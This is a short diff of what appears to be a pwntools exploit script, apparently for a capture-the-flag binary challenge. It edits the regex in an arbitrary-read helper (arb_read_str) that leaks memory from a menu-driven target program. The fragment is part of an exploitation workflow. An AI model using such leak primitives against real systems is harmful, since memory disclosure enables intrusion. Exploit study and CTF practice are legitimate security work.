@@ -150,7 +150,7 @@ def arb_read_str(address):
     p.sendafter(b'> ', b'3\n')
     p.sendafter(b'index: \n> ', b'0\n')
     leak_bytes = p.recvuntil(b'\n\n')
-    m = re.search(b'name: (.*)\n\n', leak_bytes)
+    m = re.search(b'name: (.*)\n\n', leak_bytes, re.MULTILINE | re.DOTALL)
     return m.groups()[0]
 
 
